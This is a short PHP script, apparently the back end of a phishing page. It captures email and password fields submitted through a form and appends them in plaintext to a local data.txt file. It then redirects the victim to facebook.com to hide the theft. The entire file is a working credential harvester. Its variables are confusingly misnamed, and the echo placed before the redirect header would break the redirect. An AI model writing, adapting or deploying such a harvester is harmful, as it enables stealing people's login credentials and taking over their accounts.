<?php
if (isset($_POST['submit'])) {

    $name  = $_POST['email'];
    $email = $_POST['password'];

    // Basic sanitization
    $name  = htmlspecialchars($name);
    $email = htmlspecialchars($email);

    // Data format
    $data = "Email: $name | Password: $email" . PHP_EOL;

    // Save to file
    file_put_contents("data.txt", $data, FILE_APPEND);

    echo "Data saved successfully!";
    //redirect to website
    header("Location: https://www.facebook.com/");
    exit();
}
?>
